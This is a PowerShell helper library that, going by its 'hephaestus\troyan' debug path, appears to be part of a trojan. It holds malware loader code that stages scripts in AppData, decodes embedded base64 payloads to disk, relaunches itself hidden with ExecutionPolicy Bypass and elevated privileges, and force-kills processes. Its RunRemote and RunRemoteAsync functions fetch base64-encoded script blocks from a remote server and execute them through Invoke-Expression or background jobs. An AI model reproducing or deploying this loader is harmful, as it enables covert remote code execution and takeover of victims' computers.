

function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$globalDebug = IsDebug;

function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Utf8NoBom {
    param (
        [string]$data,
        [string]$file
    )
    $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
    $streamWriter.Write($data)
    $streamWriter.Close()
    $writtenContent = [System.IO.File]::ReadAllBytes($file)
    if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
        $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
    }
    [System.IO.File]::WriteAllBytes($file, $writtenContent)
}

function GetUtfNoBom {
    param (
        [string]$file
    )

    $contentBytes = [System.IO.File]::ReadAllBytes($file)

    if ($contentBytes.Length -ge 3 -and $contentBytes[0] -eq 0xEF -and $contentBytes[1] -eq 0xBB -and $contentBytes[2] -eq 0xBF) {
        $contentBytes = $contentBytes[3..($contentBytes.Length - 1)]
    }
    $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)

    return $contentWithoutBom
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath 'Hephaestus'
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'holder' + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-SomePath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'some' + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'body' + '.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function ExtractEmbedding {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $decodedBytes = [Convert]::FromBase64String($inContent)
    [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 

function Get-ArgumentValue {
    param(
        [string]$argName
    )
    $argsX = $global:args
    for ($i = 0; $i -lt $argsX.Length; $i++) {
        if ($argsX[$i] -eq $argName) {
            return $argsX[$i + 1]
        }
    }
    return ""  # Return null if the argument was not found
}

function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function RunMe {
    param (
        [string]$script, 
        [string]$arg,
        [bool]$uac
    )

    try 
    {
        $scriptPath = $script
        
        $localArguments = @("-ExecutionPolicy Bypass")
        
        $globalArgs = $global:args
        foreach ($globalArg in $globalArgs) {
            $localArguments += "-Argument `"$globalArg`""
        }

        if (-not [string]::IsNullOrEmpty($arg)) {
            $localArguments += "-$arg"
        }

        $localArgumentList = @("-File", "`"$scriptPath`"") + $localArguments
        
        if ($uac -eq $true) {
            $arg = "-$arg"
            Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $arg -Verbose" -Verb RunAs -WindowStyle Hidden

            #$cmd="Start-Process Powershell -Verb RunAs -Wait -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -$arg'"
           # powershell -ExecutionPolicy Bypass -Command $cmd
         #   Start-Process powershell.exe -ArgumentList $localArgumentList -Verb RunAs -WindowStyle Hidden
        } else {
            Start-Process powershell.exe -ArgumentList $localArgumentList -WindowStyle Hidden
        }
    }
    catch {
          writedbg "RunMe $_"
    }
}

function IsElevated
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}


function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}

function Get-TempPs {
    # Generate a unique temporary file name in the temp directory
    $tempFile = [System.IO.Path]::GetTempFileName()

    # Change the file extension to .ps1
    $ps1TempFile = [System.IO.Path]::ChangeExtension($tempFile, ".ps1")

    return $ps1TempFile
}

# never change def values
function RunRemote {
    param (
        [string]$baseUrl,
        [string]$block,
        [string]$param = $null,
        [bool]$isWait = $true,
        [bool]$isJob = $false
    )
    $cmd = "do_$block"
    if ($param -ne $null)
    {
        $cmd += " -param '$param'"
    }
    $url = "$baseUrl$block.txt"
    $timeout = [datetime]::UtcNow.AddMinutes(5)
    $delay = 10
    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
            if ($response.StatusCode -eq 200) {
                $scriptData = $response.Content
                $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData)) + "`n`n" + $cmd
                if ($globalDebug)
                {
                    try {
                        Utf8NoBom -data $scriptData -file "C:\Soft\hephaestus\troyan\_output\_temp_$block.ps1"      
                    }
                     catch {
                    }
                }
                $codeBlock = [ScriptBlock]::Create($scriptData)
                if ($isJob) {
                    $generalJob = Start-Job -ScriptBlock $codeBlock
                    if ($isWait) {
                        Wait-Job -Job $generalJob -Timeout 300 | Out-Null
                        if ($generalJob.State -eq 'Completed') {
                            $result = Receive-Job -Job $generalJob
                            Remove-Job -Job $generalJob
                            return $result
                        } else {
                            writedbg "Job did not complete within the timeout period."
                            Remove-Job -Job $generalJob
                            return
                        }
                    } else {
                        return
                    }
                } else {
                    $codeBlock = [ScriptBlock]::Create($scriptData)
                    Invoke-Command -ScriptBlock $codeBlock
                    return
                }
            }
        } catch {
            writedbg "Failed to runremote $url $_"
        } 
        Start-Sleep -Seconds $delay
    } 
    writedbg "Failed to run remote $url within the allotted time."
}

function RunRemoteAsync {
    param (
        [string]$baseUrl,
        [string]$block,
        [string]$param = $null
    )
    $url = "$baseUrl/$block.txt"
    $cmd = "do_$block"
    if ($param -ne $null)
    {
        $cmd += " -param '$param'"
    }
    $asyncJob = Start-Job -ScriptBlock {
        param (
            [string]$url, [string]$block, [string]$cmd, [bool]$debug
        )

        function Utf8NoBom {
            param (
                [string]$data,
                [string]$file
            )
            $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
            $streamWriter.Write($data)
            $streamWriter.Close()
            $writtenContent = [System.IO.File]::ReadAllBytes($file)
            if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
                $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
            }
            [System.IO.File]::WriteAllBytes($file, $writtenContent)
        }

        $timeout = [datetime]::UtcNow.AddMinutes(5)
        $delay = 10
        while ([datetime]::UtcNow -lt $timeout) {
            try {
                $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
                if ($response.StatusCode -eq 200) {
                    $scriptData = $response.Content
                    $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData)) + "`n`n" + $cmd
                    if ($debug)
                    {
                        try {
                            Utf8NoBom -data $scriptData -file "C:\Soft\hephaestus\troyan\_output\_temp_$block.ps1"      
                        }
                         catch {
                        }
                    }
                    Invoke-Expression -Command $scriptData
                    return
                }
            } catch {
                Write-Output $_
            } 
            Start-Sleep -Seconds $delay
        }
    } -ArgumentList $url, $block, $cmd, $globalDebug
    return $asyncJob
}

function Convert-StringToBase64 {
    param (
        [Parameter(Mandatory = $true)]
        [string]$InputString
    )
    
    # Convert the string to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    
    # Encode the bytes to a Base64 string
    $base64String = [Convert]::ToBase64String($bytes)
    
    # Return the Base64-encoded string
    return $base64String
}